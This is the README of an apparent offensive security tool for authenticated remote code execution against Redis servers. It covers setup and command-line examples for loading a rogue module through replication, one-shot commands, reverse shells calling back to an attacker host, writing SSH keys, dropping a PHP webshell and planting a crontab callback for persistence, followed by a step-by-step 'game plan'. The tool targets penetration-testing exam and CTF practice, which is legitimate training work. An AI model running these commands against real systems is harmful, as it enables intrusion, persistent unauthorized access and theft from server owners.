# Redis-RCE-Husky

```
    __  ____  _______ __ ____  __
   / / / / / / / ___// //_/\ \ \/ /
  / /_/ / / / /\__ \/ ,<    \  /
 / __  / /_/ /___/ / /| |   / /
/_/ /_/\____//____/_/ |_|  /_/
    ____  __________  _________    ____  ____________
   / __ \/ ____/ __ \/  _/ ___/   / __ \/ ____/ ____/
  / /_/ / __/ / / / // / \__ \   / /_/ / /   / __/
 / _, _/ /___/ /_/ // / ___/ /  / _, _/ /___/ /___
/_/ |_/_____/_____/___//____/  /_/ |_|\____/_____/

    R E P L I C A T I O N  +  M O D U L E  R C E
    Persistence first. Shell second. Cron can't touch this.
```

Redis 4.x/5.x/6.x/7.x authenticated RCE tool. Combines the replication MODULE LOAD exploit with three persistence methods that don’t need MODULE LOAD at all — SSH key write, webshell drop, and crontab injection.

Based on Ridter/redis-rce and n0b0dyCN/redis-rogue-server, rebuilt for OSCP conditions.

## Setup

```bash
git clone https://github.com/HackingHusky/Redis-RCE-Husky.git
cd Redis-RCE-Husky
chmod +x husky-redis-rce.py
```

A pre-built `module.so` (x86_64 Linux) is included. To recompile:

```bash
cd RedisModules-ExecuteCommand && make && cp module.so .. && cd ..
```

**No pip dependencies** — stdlib Python 3.6+ only.

## Quick Start

```bash
# Recon first
python3 husky-redis-rce.py -r TARGET --recon

# One-shot RCE
python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id'

# Interactive shell
python3 husky-redis-rce.py -r TARGET -l LHOST

# SSH key persistence (no module needed — survives cron resets)
ssh-keygen -t rsa -f husky_key -N ''
python3 husky-redis-rce.py -r TARGET --ssh-key husky_key.pub
ssh -i husky_key redis@TARGET
```

## All Modes

| Mode | Command | Needs Module? |
| --- | --- | --- |
| Recon | `--recon` | No |
| One-shot | `-x 'command'` | Yes |
| Interactive shell | (default after exploit) | Yes |
| Reverse shell | `--rev --lport-rev 4444 --listen` | Yes |
| SSH key write | `--ssh-key key.pub` | **No** |
| Webshell write | `--webshell /var/www/html` | **No** |
| Crontab persist | `--crontab --lhost IP --lport-rev PORT` | **No** |
| Server-only | `--server-only` (SSRF/blind) | Yes |

## OSCP Game Plan

When you hit a Redis box with a cron resetting everything every few minutes:

```bash
# 1. SSH key FIRST — survives any Redis reset
python3 husky-redis-rce.py -r TARGET --ssh-key husky_key.pub

# 2. SSH in — stable access
ssh -i husky_key redis@TARGET

# 3. THEN do MODULE LOAD if you need command output
python3 husky-redis-rce.py -r TARGET -l LHOST -x 'cat /root/proof.txt'
```

## Examples

```bash
# With auth
python3 husky-redis-rce.py -r TARGET -l LHOST -a 'password' -x 'id'

# Reverse shell with built-in listener (no separate nc)
python3 husky-redis-rce.py -r TARGET -l LHOST --rev --lport-rev 4444 --listen

# Different reverse shell payload
python3 husky-redis-rce.py -r TARGET -l LHOST --rev --lport-rev 4444 --payload bash

# Webshell (no module needed)
python3 husky-redis-rce.py -r TARGET --webshell /var/www/html
# → http://TARGET/husky.php?cmd=id

# Crontab persistence (calls back every minute)
python3 husky-redis-rce.py -r TARGET --crontab --lhost LHOST --lport-rev 4444

# Auto-retry on unstable targets
python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id' --retry 3

# Server-only for SSRF/blind chains
python3 husky-redis-rce.py -l LHOST --server-only

# Non-standard port
python3 husky-redis-rce.py -r TARGET -p 6380 -l LHOST -x 'id'

# Verbose (see RESP traffic)
python3 husky-redis-rce.py -r TARGET -l LHOST -x 'id' -v
```

## Flags

```
  -r, --target        Target Redis host
  -p, --rport         Redis port (default: 6379)
  -a, --auth          Redis password
  -l, --lhost         Your IP (reachable from target)
  --lport             Rogue server port (default: 21000)
  -f, --file          Module .so file (default: module.so)
  --module-name       Filename on target (default: husky.so)
  -x, --cmd           One-shot command
  --rev               Reverse shell mode
  --lport-rev         Reverse shell port
  --listen            Built-in reverse shell listener
  --payload           Shell type: module/mkfifo/bash/python
  --ssh-key           Write SSH pubkey (path to .pub file)
  --ssh-dir           Override target .ssh directory
  --webshell          Write PHP webshell to this path
  --crontab           Write cron reverse shell
  --recon             Fingerprint only
  --server-only       Rogue server only
  --retry N           Retry on failure (default: 1)
  --timeout N         Socket timeout (default: 8)
  -v                  Verbose RESP traffic
```

## Repo Structure

```
Redis-RCE-Husky/
├── husky-redis-rce.py              # Main exploit script
├── module.so                        # Pre-built module (x86_64)
├── README.md
├── .gitignore
└── RedisModules-ExecuteCommand/     # Module source
    ├── Makefile
    └── src/
        ├── module.c                 # Fixed C source (all bugs patched)
        └── redismodule.h            # Redis Module SDK header
```

## Credits

- Ridter/redis-rce
- n0b0dyCN/redis-rogue-server
- n0b0dyCN/RedisModules-ExecuteCommand
- Pavel Toporkov — Redis Post-Exploitation (ZeroNights 2018)

## Disclaimer

For authorized security testing and CTF competitions only.
